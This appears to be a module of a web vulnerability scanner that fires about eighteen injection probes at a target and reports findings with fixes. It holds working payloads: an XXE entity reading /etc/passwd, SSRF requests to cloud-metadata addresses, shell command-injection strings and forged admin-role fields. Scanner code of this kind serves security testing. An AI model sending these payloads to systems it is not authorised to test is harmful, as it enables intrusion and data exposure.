'use strict';

/**
 * injectionAdvanced.js — AGGRESSIVE. Advanced injection probes (checks 1-20).
 * In-band detection only: reflected content, error signatures, evaluated math,
 * status/length diffs, and bounded timing. Same-origin, finite.
 */

const { URL } = require('url');
const P = require('../probeUtils');
const REF = 'https://owasp.org/www-project-web-security-testing-guide/';

function fire(ctx, f) { ctx.finding({ category: 'Data Validation', reference: REF, ...f }); }

// 1. XXE — inject an XML body carrying a file:// entity into form/base endpoint.
async function xxe(ctx) {
  const { http, target, log } = ctx;
  const payload =
    `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>`;
  const endpoints = [target, ...P.forms(ctx).map((f) => f.action)];
  for (const url of [...new Set(endpoints)].slice(0, 4)) {
    try {
      const r = await http.request(url, {
        method: 'POST', timeout: 10000, followRedirects: false,
        headers: { 'Content-Type': 'application/xml' }, body: payload,
      });
      if (P.SIGS.passwd.test(r.body || '')) {
        log('vuln', `XXE: ${url} returned /etc/passwd contents`);
        fire(ctx, { title: `XXE Injection at ${new URL(url).pathname}`, status: 'fail', severity: 'critical',
          evidence: `POSTing an XML external entity returned /etc/passwd from ${url}.`,
          remediation: 'Disable external entity resolution (set FEATURE_SECURE_PROCESSING; disallow DOCTYPE).',
          request: { method: 'POST', url, headers: { 'Content-Type': 'application/xml' }, body: payload, payload, status: r.status } });
        return;
      }
    } catch (e) { log('debug', `xxe ${url}: ${e.message}`); }
  }
}

// 2. SSTI multi-engine
async function ssti(ctx) {
  const { log } = ctx;
  const payloads = ['{{7*7}}', '${7*7}', '<%=7*7%>', '#{7*7}', '{{7*"7"}}'];
  for (const { url, param } of P.paramTargets(ctx, 25)) {
    for (const pl of payloads) {
      try {
        const r = await ctx.http.request(P.withParam(url, param, pl), { timeout: 9000 });
        const body = r.body || '';
        if (/(^|[^\d])(49|7777777)([^\d]|$)/.test(body) && !body.includes(pl)) {
          log('vuln', `SSTI: param "${param}" evaluated ${pl}`);
          fire(ctx, { title: `Server-Side Template Injection in "${param}"`, status: 'fail', severity: 'high',
            evidence: `Template expression ${pl} was evaluated (found 49/7777777) at ${url}.`,
            remediation: 'Never render user input as a template; sandbox the engine.',
            request: { method: 'GET', url: P.withParam(url, param, pl), param, payload: pl, status: r.status } });
          return;
        }
      } catch (e) { log('debug', `ssti: ${e.message}`); }
    }
  }
}

// 3/4. LDAP & XPath injection (error/diff)
async function ldapXpath(ctx) {
  const { log } = ctx;
  for (const { url, param } of P.paramTargets(ctx, 20)) {
    try {
      const r = await ctx.http.request(P.withParam(url, param, '*)(&'), { timeout: 9000 });
      if (P.SIGS.ldapError.test(r.body || '')) {
        log('vuln', `LDAP injection: "${param}"`);
        fire(ctx, { title: `LDAP Injection in "${param}"`, status: 'fail', severity: 'high',
          evidence: `LDAP error signature returned for a filter-breaking payload at ${url}.`,
          remediation: 'Escape LDAP metacharacters; use parameterized directory queries.',
          request: { method: 'GET', url: P.withParam(url, param, '*)(&'), param, payload: '*)(&', status: r.status } });
      }
      const rx = await ctx.http.request(P.withParam(url, param, "']"), { timeout: 9000 });
      if (P.SIGS.xpathError.test(rx.body || '')) {
        log('vuln', `XPath injection: "${param}"`);
        fire(ctx, { title: `XPath Injection in "${param}"`, status: 'fail', severity: 'high',
          evidence: `XPath error signature returned for a broken XPath payload at ${url}.`,
          remediation: 'Use parameterized XPath / precompiled expressions; validate input.',
          request: { method: 'GET', url: P.withParam(url, param, "']"), param, payload: "']", status: rx.status } });
      }
    } catch (e) { log('debug', `ldap/xpath: ${e.message}`); }
  }
}

// 5. SSRF via URL params (in-band metadata/internal reflection)
async function ssrf(ctx) {
  const { log } = ctx;
  const internal = ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:80/', 'http://localhost/'];
  for (const { url, param } of P.paramTargets(ctx, 15)) {
    if (!/url|uri|link|src|dest|redirect|next|target|host|domain|feed|callback|proxy|fetch|path/i.test(param)) continue;
    for (const inj of internal) {
      try {
        const r = await ctx.http.request(P.withParam(url, param, inj), { timeout: 9000 });
        if (P.SIGS.metadata.test(r.body || '')) {
          log('vuln', `SSRF: "${param}" reflected internal/metadata content`);
          fire(ctx, { title: `Server-Side Request Forgery in "${param}"`, status: 'fail', severity: 'critical',
            evidence: `Injecting ${inj} caused internal/cloud-metadata content to appear in the response.`,
            remediation: 'Allowlist outbound hosts; block link-local/internal ranges; disable unused URL fetchers.',
            request: { method: 'GET', url: P.withParam(url, param, inj), param, payload: inj, status: r.status } });
          return;
        }
      } catch (e) { log('debug', `ssrf: ${e.message}`); }
    }
  }
}

// 6. Prototype pollution
async function protoPollution(ctx) {
  const { log } = ctx;
  const tok = P.marker('pp');
  for (const { url, param } of P.paramTargets(ctx, 12)) {
    try {
      const u = new URL(url);
      u.searchParams.set('__proto__[' + tok + ']', tok);
      u.searchParams.set(param, '1');
      const r = await ctx.http.request(u.toString(), { timeout: 9000 });
      if ((r.body || '').includes(tok) && /__proto__|prototype|polluted/i.test(r.body)) {
        log('vuln', `Prototype pollution reflected on ${url}`);
        fire(ctx, { title: 'Possible Prototype Pollution', status: 'warn', severity: 'medium',
          evidence: `Injected __proto__[${tok}] key surfaced in the response (heuristic).`,
          remediation: 'Reject __proto__/constructor keys; use Map or null-proto objects for merges.',
          request: { method: 'GET', url: u.toString(), param, payload: `__proto__[${tok}]=${tok}`, status: r.status } });
        return;
      }
    } catch (e) { log('debug', `proto: ${e.message}`); }
  }
}

// 7. Host header injection
async function hostHeader(ctx) {
  const { http, target, log } = ctx;
  const evil = 'smartscan-evil.example';
  try {
    const r = await http.request(target, { timeout: 9000, followRedirects: false,
      headers: { Host: evil, 'X-Forwarded-Host': evil } });
    const loc = r.headers['location'] || '';
    if ((r.body || '').includes(evil) || loc.includes(evil)) {
      log('vuln', 'Host header reflected (password-reset poisoning risk)');
      fire(ctx, { category: 'Configuration Management', title: 'Host Header Injection', status: 'fail', severity: 'medium',
        evidence: `Spoofed Host/X-Forwarded-Host "${evil}" was reflected into the response or redirect.`,
        remediation: 'Validate Host against an allowlist; do not build absolute URLs/links from the Host header.',
        request: { method: 'GET', url: target, headers: { Host: evil, 'X-Forwarded-Host': evil }, payload: `Host: ${evil}`, status: r.status } });
    }
  } catch (e) { log('debug', `hosthdr: ${e.message}`); }
}

// 8. Request smuggling (heuristic, low-confidence)
async function smuggling(ctx) {
  const { target, log } = ctx;
  try {
    const u = new URL(target);
    // Send an ambiguous CL.TE request via rawRequest with conflicting framing headers.
    const r = await ctx.http.rawRequest(target, {
      method: 'POST', timeout: 8000,
      headers: { 'Content-Length': '4', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/plain' },
      body: '0\r\n\r\nG',
    });
    if (r.status === 400 || r.status === 501) {
      log('ok', 'Server rejected ambiguous CL/TE framing (good)');
    } else if (r.elapsedMs > 6000) {
      log('warn', 'Ambiguous CL.TE request stalled — possible desync (heuristic)');
      fire(ctx, { title: 'Possible HTTP Request Smuggling (CL.TE)', status: 'warn', severity: 'medium',
        evidence: `Ambiguous Content-Length/Transfer-Encoding request stalled ~${r.elapsedMs}ms (LOW-CONFIDENCE heuristic; confirm manually).`,
        remediation: 'Reject requests with both CL and TE; normalize framing at the front-end proxy.',
        request: { method: 'POST', url: target, headers: { 'Content-Length': '4', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/plain' }, body: '0\r\n\r\nG' } });
    }
  } catch (e) { log('debug', `smuggle: ${e.message}`); }
}

// 9. Web cache poisoning (unkeyed header reflection + cache echo)
async function cachePoison(ctx) {
  const { target, log } = ctx;
  const tok = P.marker('cp');
  try {
    const inject = await ctx.http.request(target, { timeout: 9000, headers: { 'X-Forwarded-Host': tok + '.example' } });
    if ((inject.body || '').includes(tok)) {
      const plain = await ctx.http.request(target, { timeout: 9000 });
      const cached = /HIT/i.test(plain.headers['x-cache'] || '') || !!plain.headers['age'];
      if ((plain.body || '').includes(tok) && cached) {
        log('vuln', 'Web cache poisoning: unkeyed header reflected and cached');
        fire(ctx, { category: 'Configuration Management', title: 'Web Cache Poisoning', status: 'fail', severity: 'high',
          evidence: `X-Forwarded-Host value was reflected and then served from cache to a clean request.`,
          remediation: 'Include reflected headers in the cache key or stop reflecting them.',
          request: { method: 'GET', url: target, headers: { 'X-Forwarded-Host': tok + '.example' }, payload: `X-Forwarded-Host: ${tok}.example` } });
      } else {
        log('warn', 'Unkeyed header reflected (cache poisoning possible if cached)');
        fire(ctx, { category: 'Configuration Management', title: 'Unkeyed header reflection (X-Forwarded-Host)', status: 'warn', severity: 'low',
          evidence: 'X-Forwarded-Host was reflected in the response body.',
          remediation: 'Do not reflect X-Forwarded-Host; validate/ignore it.',
          request: { method: 'GET', url: target, headers: { 'X-Forwarded-Host': tok + '.example' }, payload: `X-Forwarded-Host: ${tok}.example` } });
      }
    }
  } catch (e) { log('debug', `cache: ${e.message}`); }
}

// 11. SSI injection
async function ssi(ctx) {
  const { log } = ctx;
  const tok = P.marker('ssi');
  for (const { url, param } of P.paramTargets(ctx, 12)) {
    try {
      const r = await ctx.http.request(P.withParam(url, param, `<!--#echo var="${tok}"-->`), { timeout: 9000 });
      // A processed SSI echo of an undefined var yields "(none)"; reflection returns the literal.
      const body = r.body || '';
      if (/\(none\)/.test(body) && !body.includes(tok)) {
        log('vuln', `SSI injection: "${param}"`);
        fire(ctx, { title: `Server-Side Includes (SSI) Injection in "${param}"`, status: 'fail', severity: 'high',
          evidence: `SSI directive was processed (echoed "(none)" for an undefined var) at ${url}.`,
          remediation: 'Disable SSI on user-controlled output; encode < and >.',
          request: { method: 'GET', url: P.withParam(url, param, `<!--#echo var="${tok}"-->`), param, payload: `<!--#echo var="${tok}"-->`, status: r.status } });
        return;
      }
    } catch (e) { log('debug', `ssi: ${e.message}`); }
  }
}

// 12. EL / OGNL
async function elInjection(ctx) {
  const { log } = ctx;
  for (const { url, param } of P.paramTargets(ctx, 12)) {
    for (const pl of ['${1337*1}', '%{1337*1}', '#{1337*1}']) {
      try {
        const r = await ctx.http.request(P.withParam(url, param, pl), { timeout: 9000 });
        const body = r.body || '';
        if (body.includes('1337') && !body.includes(pl)) {
          log('vuln', `Expression Language injection: "${param}"`);
          fire(ctx, { title: `Expression Language / OGNL Injection in "${param}"`, status: 'fail', severity: 'high',
            evidence: `EL expression ${pl} evaluated to 1337 at ${url}.`,
            remediation: 'Do not evaluate user input as EL/OGNL; upgrade frameworks with EL sandboxes.',
            request: { method: 'GET', url: P.withParam(url, param, pl), param, payload: pl, status: r.status } });
          return;
        }
      } catch (e) { log('debug', `el: ${e.message}`); }
    }
  }
}

// 13. XSLT injection (reflection of xsl markers)
async function xslt(ctx) {
  const { log } = ctx;
  const pl = `<xsl:value-of select="system-property('xsl:version')"/>`;
  for (const { url, param } of P.paramTargets(ctx, 8)) {
    try {
      const r = await ctx.http.request(P.withParam(url, param, pl), { timeout: 9000 });
      if (/\b1\.0\b/.test(r.body || '') && !(r.body || '').includes('xsl:value-of')) {
        log('vuln', `XSLT injection: "${param}"`);
        fire(ctx, { title: `XSLT Injection in "${param}"`, status: 'fail', severity: 'high',
          evidence: `system-property('xsl:version') was evaluated (returned 1.0) at ${url}.`,
          remediation: 'Disable dangerous XSLT extensions; never compile user-supplied stylesheets.',
          request: { method: 'GET', url: P.withParam(url, param, pl), param, payload: pl, status: r.status } });
        return;
      }
    } catch (e) { log('debug', `xslt: ${e.message}`); }
  }
}

// 14. CSV / formula injection (reflected)
async function csvInjection(ctx) {
  const { log } = ctx;
  const pl = '=1+1+cmd|';
  for (const f of P.forms(ctx).slice(0, 4)) {
    try {
      const values = {};
      for (const i of f.inputs) if (/text|search|email|url|hidden/.test(i.type)) values[i.name] = pl;
      if (!Object.keys(values).length) continue;
      const r = await P.submitForm(ctx, f, values);
      if ((r.body || '').includes(pl)) {
        log('warn', `CSV/formula value reflected via ${f.action}`);
        fire(ctx, { title: 'CSV / Formula Injection (reflected)', status: 'warn', severity: 'low',
          evidence: `A leading-"=" formula payload was stored/reflected via ${f.action}; risky if exported to CSV/XLS.`,
          remediation: 'Prefix exported cells starting with = + - @ with a single quote; sanitize on export.',
          request: { method: f.method || 'POST', url: f.action, payload: pl, status: r.status } });
        return;
      }
    } catch (e) { log('debug', `csv: ${e.message}`); }
  }
}

// 15. NoSQL operator injection
async function nosql(ctx) {
  const { log } = ctx;
  for (const { url, param } of P.paramTargets(ctx, 15)) {
    try {
      // followRedirects:false so an open redirect on the param doesn't masquerade as a diff.
      const base = await ctx.http.request(P.withParam(url, param, 'x'), { timeout: 9000, followRedirects: false });
      const u = new URL(url);
      u.searchParams.delete(param);
      u.searchParams.set(param + '[$ne]', 'x');
      const inj = await ctx.http.request(u.toString(), { timeout: 9000, followRedirects: false });
      if (inj.status === 200 && base.status === 200 &&
          Math.abs((inj.body || '').length - (base.body || '').length) > 80) {
        log('vuln', `NoSQL operator injection: "${param}"`);
        fire(ctx, { title: `NoSQL Operator Injection in "${param}"`, status: 'fail', severity: 'high',
          evidence: `Operator payload ${param}[$ne] changed the response materially vs a scalar value.`,
          remediation: 'Cast/validate query params to expected types; reject object/operator inputs.',
          request: { method: 'GET', url: u.toString(), param: param + '[$ne]', payload: 'x', status: inj.status } });
        return;
      }
    } catch (e) { log('debug', `nosql: ${e.message}`); }
  }
}

// 16. GraphQL introspection
async function graphql(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  const q = JSON.stringify({ query: '{__schema{types{name}}}' });
  for (const path of ['/graphql', '/api/graphql', '/v1/graphql', '/query']) {
    try {
      const r = await ctx.http.request(`${origin.protocol}//${origin.host}${path}`, {
        method: 'POST', timeout: 9000, headers: { 'Content-Type': 'application/json' }, body: q,
      });
      if (r.status === 200 && /__schema|"types"|queryType/i.test(r.body || '')) {
        log('vuln', `GraphQL introspection enabled at ${path}`);
        fire(ctx, { title: `GraphQL Introspection Enabled (${path})`, status: 'fail', severity: 'medium',
          evidence: `Introspection query returned the schema at ${path}.`,
          remediation: 'Disable introspection in production; enforce query allowlists/depth limits.',
          request: { method: 'POST', url: `${origin.protocol}//${origin.host}${path}`, headers: { 'Content-Type': 'application/json' }, body: q, status: r.status } });
        return;
      }
    } catch (e) { log('debug', `graphql: ${e.message}`); }
  }
}

// 17. Deserialization markers (detect exposed serialized blobs)
async function deserialization(ctx) {
  const { log } = ctx;
  const res = ctx.shared.baseResponse;
  const hay = (res ? (res.body || '') + JSON.stringify(res.headers || {}) : '') +
    (P.cookiesFrom(res).map((c) => c.value).join(' '));
  const sigs = [
    { re: /rO0AB/, name: 'Java (rO0AB)' },
    { re: /__VIEWSTATE/, name: '.NET __VIEWSTATE' },
    { re: /\bO:\d+:"/, name: 'PHP serialized object' },
    { re: /ZXlK|gASV/, name: 'Python pickle/base64' },
  ];
  for (const s of sigs) {
    if (s.re.test(hay)) {
      log('warn', `Serialized object exposed: ${s.name}`);
      fire(ctx, { title: `Exposed serialized object (${s.name})`, status: 'warn', severity: 'medium',
        evidence: `A ${s.name} serialized blob is exposed client-side; a tampering/deserialization sink may exist.`,
        remediation: 'Do not accept serialized objects from clients; use signed, typed formats (JSON) with validation.' });
    }
  }
}

// 18. Mass assignment / autobinding
async function massAssignment(ctx) {
  const { log } = ctx;
  const extras = { role: 'admin', isAdmin: 'true', admin: '1', is_admin: 'true', user_role: 'admin' };
  for (const f of P.loginForms(ctx).concat(P.forms(ctx)).slice(0, 5)) {
    try {
      const base = await P.submitForm(ctx, f, {});
      const inj = await P.submitForm(ctx, f, { ...extras });
      const changed = inj.status !== base.status ||
        Math.abs((inj.body || '').length - (base.body || '').length) > 60;
      if (changed && inj.status < 500 && !/invalid|error|not allowed/i.test(inj.body || '')) {
        log('warn', `Mass assignment: ${f.action} reacted to injected privileged fields`);
        fire(ctx, { category: 'Authorization', title: 'Possible Mass Assignment / Autobinding', status: 'warn', severity: 'medium',
          evidence: `Adding role/isAdmin/admin fields to ${f.action} changed the response (heuristic).`,
          remediation: 'Bind only allowlisted fields (DTOs); never map request params directly to models.',
          request: { method: f.method || 'POST', url: f.action, payload: 'role=admin&isAdmin=true&admin=1', status: inj.status } });
        return;
      }
    } catch (e) { log('debug', `massassign: ${e.message}`); }
  }
}

// 19. HTTP parameter pollution
async function hpp(ctx) {
  const { log } = ctx;
  for (const { url, param } of P.paramTargets(ctx, 12)) {
    try {
      const single = await ctx.http.request(P.withParam(url, param, 'aaa'), { timeout: 9000 });
      const dbl = await ctx.http.request(`${P.withParam(url, param, 'aaa')}&${encodeURIComponent(param)}=bbb`, { timeout: 9000 });
      if (single.status !== dbl.status || Math.abs((single.body || '').length - (dbl.body || '').length) > 100) {
        log('warn', `HTTP parameter pollution affects "${param}"`);
        fire(ctx, { title: `HTTP Parameter Pollution in "${param}"`, status: 'warn', severity: 'low',
          evidence: `Duplicating "${param}" changed the response vs a single value (parser ambiguity).`,
          remediation: 'Normalize duplicate parameters server-side; reject unexpected repeats.',
          request: { method: 'GET', url: `${P.withParam(url, param, 'aaa')}&${encodeURIComponent(param)}=bbb`, param, payload: `${param}=aaa&${param}=bbb`, status: dbl.status } });
        return;
      }
    } catch (e) { log('debug', `hpp: ${e.message}`); }
  }
}

// 20. Blind time-based command injection
async function blindCmd(ctx) {
  const { log, options } = ctx;
  const delay = 3;
  const payloads = [`;sleep ${delay}`, `| sleep ${delay}`, `$(sleep ${delay})`, `& ping -n ${delay + 1} 127.0.0.1 &`];
  for (const { url, param } of P.paramTargets(ctx, 10)) {
    try {
      const baseline = (await P.timedRequest(ctx, P.withParam(url, param, '1'))).ms;
      for (const pl of payloads) {
        const t = (await P.timedRequest(ctx, P.withParam(url, param, pl))).ms;
        if (t - baseline > (delay * 1000) - 700) {
          log('vuln', `Blind command injection (time-based): "${param}" +${t - baseline}ms`);
          fire(ctx, { title: `Blind Command Injection (time-based) in "${param}"`, status: 'fail', severity: 'critical',
            evidence: `Payload "${pl}" delayed the response by ~${t - baseline}ms (expected ~${delay}s).`,
            remediation: 'Never pass input to a shell; use safe process APIs and strict validation.',
            request: { method: 'GET', url: P.withParam(url, param, pl), param, payload: pl } });
          return;
        }
      }
    } catch (e) { log('debug', `blindcmd: ${e.message}`); }
  }
}

async function run(ctx) {
  if (ctx.options.intensity !== 'aggressive') {
    ctx.log('debug', 'Advanced Injection skipped (requires Aggressive intensity).');
    return;
  }
  ctx.log('info', 'Advanced injection: XXE, SSTI, LDAP/XPath, SSRF, prototype pollution, host-header, smuggling, cache, SSI, EL, XSLT, CSV, NoSQL, GraphQL, deserialization, mass-assignment, HPP, blind-cmd...');
  const steps = [
    ['XXE', xxe], ['SSTI', ssti], ['LDAP/XPath', ldapXpath], ['SSRF', ssrf],
    ['prototype pollution', protoPollution], ['host header', hostHeader], ['request smuggling', smuggling],
    ['cache poisoning', cachePoison], ['SSI', ssi], ['EL/OGNL', elInjection], ['XSLT', xslt],
    ['CSV', csvInjection], ['NoSQL', nosql], ['GraphQL', graphql], ['deserialization', deserialization],
    ['mass assignment', massAssignment], ['HPP', hpp], ['blind command injection', blindCmd],
  ];
  for (const [name, fn] of steps) {
    ctx.log('debug', `→ ${name}`);
    try { await fn(ctx); } catch (e) { ctx.log('debug', `${name} error: ${e.message}`); }
  }
}

module.exports = { id: 'injectionAdvanced', category: 'Data Validation', run };
